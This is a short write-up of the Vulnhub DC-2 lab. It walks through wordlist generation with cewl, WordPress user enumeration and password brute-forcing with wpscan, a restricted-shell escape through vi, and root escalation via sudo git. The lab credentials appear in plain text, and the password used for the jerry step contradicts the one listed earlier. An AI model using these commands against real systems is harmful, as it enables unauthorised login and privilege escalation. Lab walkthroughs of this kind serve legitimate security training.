<h1>DC-2 Write-up</h1>

**NMAP** : [Click Me](https://github.com/Vanshal/Vulnhub-Writeups/blob/master/DC-2/nmap.txt)

Add 192.168.56.47   dc-2 to your host file to access WEB 

**FLAG** : http://dc-2/index.php/flag/


using cewl because as the flag hint says normal wordlist will not work

```cewl -d 5 -w wordlist http://dc-2/```


<h3>Password Attack (WPSCAN)</h3>

First Enumerate Users with the following command : 
```
wpscan --url http://dc-2/ -e u
```
Now the attack ;)

```wpscan --url http://dc-2/ -U tom,jerry -P wordlist```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-2/images/WPbrute.png)

 Username: jerry, Password: adipiscing   
 Username: tom, Password: parturient     

**Login to ssh using tom creds :**

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-2/images/rbashescape.png)


<h3>Rbash Escape </h3>

```
vi 
:set shell=/bin/sh
:shell

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

<h2>Priv Esc</h2>

```
su - jerry   # PASS : parturient (Found in Password attack of wordpress)
sudo -l 
```

[GIT SUDO ESCALATION](https://gtfobins.github.io/gtfobins/git/#sudo)

```
PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
sudo git -p help config
!/bin/sh
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-2/images/privesc%20.png)
